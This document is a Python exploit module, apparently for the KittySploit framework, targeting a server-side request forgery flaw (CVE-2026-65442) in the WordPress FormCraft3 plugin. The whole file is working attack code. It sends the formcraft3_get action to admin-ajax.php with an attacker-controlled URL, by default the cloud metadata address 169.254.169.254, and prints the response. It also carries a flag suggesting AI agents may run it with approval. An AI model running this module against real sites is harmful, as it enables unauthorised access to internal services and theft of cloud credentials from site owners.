#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FormCraft3 CVE-2026-65442 — formcraft3_get URL SSRF."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "FormCraft3 CVE-2026-65442 SSRF",
        "description": "GET formcraft3_get with attacker-controlled URL query param.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-65442"],
        "tags": ["wordpress", "formcraft", "ssrf", "cve-2026-65442"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    ssrf_url = OptString("http://169.254.169.254/", "URL parameter value", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        url = (self.ssrf_url or "http://169.254.169.254/").strip()
        resp = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={"action": "formcraft3_get", "URL": url},
            allow_redirects=False,
            timeout=20,
        )
        if resp:
            print_success("formcraft3_get invoked")
            print_status((resp.text or "")[:600])
            return True
        print_error("Request failed")
        return False
